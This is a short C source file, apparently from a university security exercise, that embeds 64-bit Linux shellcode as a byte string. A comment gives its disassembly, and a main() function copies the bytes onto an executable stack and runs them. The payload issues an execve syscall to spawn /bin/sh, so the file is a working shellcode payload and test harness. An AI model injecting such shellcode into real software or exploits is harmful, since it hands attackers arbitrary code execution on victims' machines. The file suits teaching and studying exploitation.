/** shell64_opcode.c
  Coded by Fanping Zeng(USTC). 12/06/2014 
  gcc -z execstack -o so ../shell64_opcode.c
*/
//====================================================================
#include <string.h>
char shellcode64[] =
"\x48\x31\xd2\x52\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x50"
"\x48\x89\xe7\x52\x57\x48\x89\xe1\x48\x89\xce\x48\x8d\x42\x3b\x0f\x05";
/*
00000000004004f0 <foo64_fix>:
  4004f0:	55                   	push   %rbp
  4004f1:	48 89 e5             	mov    %rsp,%rbp
  4004f4:	48 31 d2             	xor    %rdx,%rdx
  4004f7:	52                   	push   %rdx
  4004f8:	48 b8 2f 2f 62 69 6e 	movabs $0x68732f6e69622f2f,%rax
  4004ff:		2f 73 68 
  400502:	50                   	push   %rax
  400503:	48 89 e7             	mov    %rsp,%rdi
  400506:	52                   	push   %rdx
  400507:	57                   	push   %rdi
  400508:	48 89 e1             	mov    %rsp,%rcx
  40050b:	48 89 ce             	mov    %rcx,%rsi
  40050e:	48 8d 42 3b          	lea    0x3b(%rdx),%rax
  400512:	0f 05                	syscall
  400514:	5d                   	pop    %rbp
  400515:	c3                   	retq   
*/
void main()
{
    char op64code[512];
    strcpy(op64code, shellcode64);
    ((void (*)())op64code)();
}

